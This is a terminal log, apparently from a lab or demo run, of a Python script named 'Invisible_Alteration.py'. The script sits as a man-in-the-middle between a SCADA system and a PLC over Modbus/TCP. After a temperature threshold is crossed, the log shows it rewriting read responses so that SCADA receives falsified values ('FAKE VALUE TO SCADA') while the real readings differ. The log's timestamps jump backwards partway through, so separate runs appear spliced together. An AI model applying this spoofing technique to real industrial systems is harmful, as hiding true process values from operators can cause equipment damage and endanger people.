                                                                                                                                                                                          
┌──(env)─(root㉿kali)-[/home/siaka/Documents/Python_Project]
└─# python3 Invisible_Alteration.py
[*] CONNECTED TO PLC...
2025-12-25 16:14:47,673 DEBUG logging:103 Awaiting connections server_listener
2025-12-25 16:14:47,674 INFO  logging:97 Server listening.
2025-12-25 16:15:38,432 DEBUG logging:103 Connected to server
2025-12-25 16:15:38,931 DEBUG logging:103 recv: 0x0 0x1 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1 old_data:  addr=None
2025-12-25 16:15:38,931 DEBUG logging:103 Handling data: 0x0 0x1 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1
2025-12-25 16:15:38,931 DEBUG logging:103 Processing: 0x0 0x1 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1
2025-12-25 16:15:38,932 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:15:38,932 DEBUG logging:103 Current transaction state - IDLE
2025-12-25 16:15:38,932 DEBUG logging:103 Running transaction 1
2025-12-25 16:15:38,932 DEBUG logging:103 SEND: 0x0 0x1 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1
2025-12-25 16:15:38,932 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:15:38,932 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:15:38,934 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:15:38,934 DEBUG logging:103 RECV: 0x0 0x1 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:15:38,934 DEBUG logging:103 Processing: 0x0 0x1 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:15:38,934 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:15:38,934 DEBUG logging:103 Adding transaction 1
2025-12-25 16:15:38,934 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:15:38,934 DEBUG logging:103 Getting transaction 1
2025-12-25 16:15:38,934 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:15:38,935 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:15:38,935 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:15:38,935 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:15:38,935 DEBUG logging:103 send: 0x0 0x1 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:15:48,986 DEBUG logging:103 recv: 0x0 0x2 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:15:48,986 DEBUG logging:103 Handling data: 0x0 0x2 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:15:48,987 DEBUG logging:103 Processing: 0x0 0x2 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:15:48,987 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:15:48,987 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:15:48,987 DEBUG logging:103 Running transaction 2
2025-12-25 16:15:48,987 DEBUG logging:103 SEND: 0x0 0x2 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:15:48,987 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:15:48,987 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:15:48,988 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:15:48,988 DEBUG logging:103 RECV: 0x0 0x2 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1
2025-12-25 16:15:48,990 DEBUG logging:103 Processing: 0x0 0x2 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1
2025-12-25 16:15:48,990 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:15:48,990 DEBUG logging:103 Adding transaction 2
2025-12-25 16:15:48,990 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:15:48,990 DEBUG logging:103 Getting transaction 2
2025-12-25 16:15:48,990 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:15:48,991 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:15:48,991 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:15:48,991 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 446
[*] Temp > THRESHOLD: 1fois
2025-12-25 16:15:48,991 DEBUG logging:103 send: 0x0 0x2 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x44 0x1 0xbe 0x0 0x1
2025-12-25 16:16:08,434 DEBUG logging:103 recv: 0x0 0x3 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x3 0x2a 0x0 0x1 old_data:  addr=None
2025-12-25 16:16:08,435 DEBUG logging:103 Handling data: 0x0 0x3 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x3 0x2a 0x0 0x1
2025-12-25 16:16:08,435 DEBUG logging:103 Processing: 0x0 0x3 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x3 0x2a 0x0 0x1
2025-12-25 16:16:08,435 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:16:08,435 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:16:08,435 DEBUG logging:103 Running transaction 3
2025-12-25 16:16:08,435 DEBUG logging:103 SEND: 0x0 0x3 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3b 0x3 0x2a 0x0 0x1
2025-12-25 16:16:08,435 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:16:08,435 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:16:08,437 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:16:08,437 DEBUG logging:103 RECV: 0x0 0x3 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:16:08,437 DEBUG logging:103 Processing: 0x0 0x3 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:16:08,437 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:16:08,437 DEBUG logging:103 Adding transaction 3
2025-12-25 16:16:08,437 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:16:08,437 DEBUG logging:103 Getting transaction 3
2025-12-25 16:16:08,437 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:16:08,437 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:16:08,437 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:16:08,437 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:16:08,437 DEBUG logging:103 send: 0x0 0x3 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:16:19,996 DEBUG logging:103 recv: 0x0 0x4 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:16:19,996 DEBUG logging:103 Handling data: 0x0 0x4 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:16:19,996 DEBUG logging:103 Processing: 0x0 0x4 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:16:19,996 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:16:19,996 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:16:19,996 DEBUG logging:103 Running transaction 4
2025-12-25 16:16:19,996 DEBUG logging:103 SEND: 0x0 0x4 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:16:19,997 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:16:19,997 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:16:19,998 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:16:19,998 DEBUG logging:103 RECV: 0x0 0x4 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x3 0x2a 0x0 0x1
2025-12-25 16:16:19,998 DEBUG logging:103 Processing: 0x0 0x4 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3b 0x3 0x2a 0x0 0x1
2025-12-25 16:16:19,998 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:16:19,998 DEBUG logging:103 Adding transaction 4
2025-12-25 16:16:19,998 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:16:19,998 DEBUG logging:103 Getting transaction 4
2025-12-25 16:16:19,999 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:16:19,999 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:16:19,999 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:16:20,000 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 810
[*] Temp > THRESHOLD: 2fois
2025-12-25 16:00:08,262 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:00:08,264 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:00:08,264 DEBUG logging:103 RECV: 0x0 0x14 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:00:08,265 DEBUG logging:103 Processing: 0x0 0x14 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:00:08,265 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:00:08,265 DEBUG logging:103 Adding transaction 20
2025-12-25 16:00:08,265 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:08,265 DEBUG logging:103 Getting transaction 20
2025-12-25 16:00:08,265 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:00:08,265 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:08,266 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:00:08,266 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:00:08,266 DEBUG logging:103 send: 0x0 0x14 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:00:18,816 DEBUG logging:103 recv: 0x0 0x15 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:00:18,816 DEBUG logging:103 Handling data: 0x0 0x15 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:00:18,816 DEBUG logging:103 Processing: 0x0 0x15 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:00:18,816 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:00:18,817 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:00:18,817 DEBUG logging:103 Running transaction 21
2025-12-25 16:00:18,817 DEBUG logging:103 SEND: 0x0 0x15 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:00:18,817 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:00:18,817 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:00:18,818 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:00:18,818 DEBUG logging:103 RECV: 0x0 0x15 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x1f 0x1 0xc8 0x0 0x0
2025-12-25 16:00:18,818 DEBUG logging:103 Processing: 0x0 0x15 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x1f 0x1 0xc8 0x0 0x0
2025-12-25 16:00:18,818 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:00:18,818 DEBUG logging:103 Adding transaction 21
2025-12-25 16:00:18,819 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:18,819 DEBUG logging:103 Getting transaction 21
2025-12-25 16:00:18,819 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:00:18,819 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:18,819 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:00:18,819 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 456
[*] DELTA : -75.56
[*] Last value Reported to SCADA : 590.56
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 585.7
[*]==> FAKE VALUE TO SCADA: 585
2025-12-25 16:00:18,819 DEBUG logging:103 send: 0x0 0x15 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x1f 0x2 0x49 0x0 0x0
2025-12-25 16:00:38,274 DEBUG logging:103 recv: 0x0 0x16 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2b 0x2 0x5d 0x0 0x0 old_data:  addr=None
2025-12-25 16:00:38,274 DEBUG logging:103 Handling data: 0x0 0x16 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2b 0x2 0x5d 0x0 0x0
2025-12-25 16:00:38,274 DEBUG logging:103 Processing: 0x0 0x16 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2b 0x2 0x5d 0x0 0x0
2025-12-25 16:00:38,275 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:00:38,275 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:00:38,275 DEBUG logging:103 Running transaction 22
2025-12-25 16:00:38,275 DEBUG logging:103 SEND: 0x0 0x16 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x2b 0x2 0x5d 0x0 0x0
2025-12-25 16:00:38,275 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:00:38,275 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:00:38,277 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:00:38,277 DEBUG logging:103 RECV: 0x0 0x16 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:00:38,277 DEBUG logging:103 Processing: 0x0 0x16 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:00:38,277 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:00:38,277 DEBUG logging:103 Adding transaction 22
2025-12-25 16:00:38,277 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:38,277 DEBUG logging:103 Getting transaction 22
2025-12-25 16:00:38,277 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:00:38,277 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:38,277 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:00:38,277 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:00:38,277 DEBUG logging:103 send: 0x0 0x16 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:00:49,827 DEBUG logging:103 recv: 0x0 0x17 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:00:49,827 DEBUG logging:103 Handling data: 0x0 0x17 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:00:49,827 DEBUG logging:103 Processing: 0x0 0x17 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:00:49,827 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:00:49,827 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:00:49,827 DEBUG logging:103 Running transaction 23
2025-12-25 16:00:49,827 DEBUG logging:103 SEND: 0x0 0x17 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:00:49,827 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:00:49,828 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:00:49,829 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:00:49,829 DEBUG logging:103 RECV: 0x0 0x17 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x2b 0x2 0x5d 0x0 0x0
2025-12-25 16:00:49,829 DEBUG logging:103 Processing: 0x0 0x17 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x2b 0x2 0x5d 0x0 0x0
2025-12-25 16:00:49,829 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:00:49,829 DEBUG logging:103 Adding transaction 23
2025-12-25 16:00:49,829 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:49,829 DEBUG logging:103 Getting transaction 23
2025-12-25 16:00:49,829 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:00:49,829 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:00:49,829 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:00:49,829 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 605
[*] DELTA : -70.7
[*] Last value Reported to SCADA : 585.7
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 580.78
[*]==> FAKE VALUE TO SCADA: 580
2025-12-25 16:00:49,829 DEBUG logging:103 send: 0x0 0x17 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x2b 0x2 0x44 0x0 0x0
2025-12-25 16:01:08,277 DEBUG logging:103 recv: 0x0 0x18 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x33 0x1 0xb9 0x0 0x0 old_data:  addr=None
2025-12-25 16:01:08,277 DEBUG logging:103 Handling data: 0x0 0x18 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x33 0x1 0xb9 0x0 0x0
2025-12-25 16:01:08,277 DEBUG logging:103 Processing: 0x0 0x18 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x33 0x1 0xb9 0x0 0x0
2025-12-25 16:01:08,277 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:01:08,277 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:01:08,278 DEBUG logging:103 Running transaction 24
2025-12-25 16:01:08,278 DEBUG logging:103 SEND: 0x0 0x18 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x33 0x1 0xb9 0x0 0x0
2025-12-25 16:01:08,278 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:01:08,278 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:01:08,279 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:01:08,279 DEBUG logging:103 RECV: 0x0 0x18 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:01:08,279 DEBUG logging:103 Processing: 0x0 0x18 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:01:08,279 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:01:08,279 DEBUG logging:103 Adding transaction 24
2025-12-25 16:01:08,279 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:08,279 DEBUG logging:103 Getting transaction 24
2025-12-25 16:01:08,280 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:01:08,280 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:08,280 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:01:08,280 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:01:08,280 DEBUG logging:103 send: 0x0 0x18 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:01:20,837 DEBUG logging:103 recv: 0x0 0x19 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:01:20,837 DEBUG logging:103 Handling data: 0x0 0x19 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:01:20,837 DEBUG logging:103 Processing: 0x0 0x19 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:01:20,837 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:01:20,837 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:01:20,837 DEBUG logging:103 Running transaction 25
2025-12-25 16:01:20,837 DEBUG logging:103 SEND: 0x0 0x19 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:01:20,837 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:01:20,837 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:01:20,838 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:01:20,838 DEBUG logging:103 RECV: 0x0 0x19 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x33 0x1 0xb9 0x0 0x0
2025-12-25 16:01:20,838 DEBUG logging:103 Processing: 0x0 0x19 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x33 0x1 0xb9 0x0 0x0
2025-12-25 16:01:20,838 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:01:20,838 DEBUG logging:103 Adding transaction 25
2025-12-25 16:01:20,838 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:20,838 DEBUG logging:103 Getting transaction 25
2025-12-25 16:01:20,838 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:01:20,838 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:20,839 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:01:20,839 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 441
[*] DELTA : -65.78
[*] Last value Reported to SCADA : 580.78
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 576.26
[*]==> FAKE VALUE TO SCADA: 576
2025-12-25 16:01:20,839 DEBUG logging:103 send: 0x0 0x19 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x33 0x2 0x40 0x0 0x0
2025-12-25 16:01:38,278 DEBUG logging:103 recv: 0x0 0x1a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x2 0x7f 0x0 0x0 old_data:  addr=None
2025-12-25 16:01:38,278 DEBUG logging:103 Handling data: 0x0 0x1a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x2 0x7f 0x0 0x0
2025-12-25 16:01:38,279 DEBUG logging:103 Processing: 0x0 0x1a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x2 0x7f 0x0 0x0
2025-12-25 16:01:38,279 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:01:38,279 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:01:38,279 DEBUG logging:103 Running transaction 26
2025-12-25 16:01:38,279 DEBUG logging:103 SEND: 0x0 0x1a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x30 0x2 0x7f 0x0 0x0
2025-12-25 16:01:38,279 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:01:38,279 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:01:38,280 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:01:38,280 DEBUG logging:103 RECV: 0x0 0x1a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:01:38,280 DEBUG logging:103 Processing: 0x0 0x1a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:01:38,280 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:01:38,280 DEBUG logging:103 Adding transaction 26
2025-12-25 16:01:38,280 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:38,280 DEBUG logging:103 Getting transaction 26
2025-12-25 16:01:38,280 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:01:38,281 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:01:38,281 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:01:38,281 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:01:38,281 DEBUG logging:103 send: 0x0 0x1a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:01:51,848 DEBUG logging:103 recv: 0x0 0x1b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:01:51,849 DEBUG logging:103 Handling data: 0x0 0x1b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:01:51,849 DEBUG logging:103 Processing: 0x0 0x1b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:01:51,849 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:01:51,849 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:01:51,849 DEBUG logging:103 Running transaction 27
2025-12-25 16:01:51,849 DEBUG logging:103 SEND: 0x0 0x1b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:01:51,849 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:01:51,849 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:01:51,851 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
